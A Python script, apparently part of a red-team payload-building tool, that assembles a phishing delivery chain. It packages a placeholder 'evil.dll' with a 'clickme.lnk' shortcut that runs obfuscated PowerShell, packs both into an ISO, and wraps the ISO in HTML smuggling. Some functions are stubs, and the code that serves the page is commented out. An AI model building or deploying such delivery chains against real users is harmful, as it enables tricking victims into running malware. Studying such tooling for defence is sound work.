from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso

from model import AceFile


def readFile(filename):
    data = b'readFile.dll'
    return data


def obfuscatePowershell(input, options):
    return "{}".format(input)

def makeVbs(input):
    pass

def makeJs():
    pass


def main():
    payloadData = readFile('evil.dll')
    payloadFile = AceFile('evil.dll', payloadData)
    
    payloadExecData = 'ls evil.dll'
    payloadExecData = obfuscatePowershell(
        input=payloadExecData,
        options = {},
    )
    payloadExec = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -command {}".format(payloadExecData),
    )
    payloadExeFile = AceFile('clickme.lnk', payloadExec)

    container = makeIso(
        files = [
            payloadFile,
            payloadExeFile,
        ],
    )
    containerFile = AceFile('test.iso', container)

    html = makeHtmlSmuggling(
        containerFile,
    )

    #serveHtml = serve(
    #    file=html,
    #    path="/test"
    #)

    #server(serveHtml)

    print(html)

main()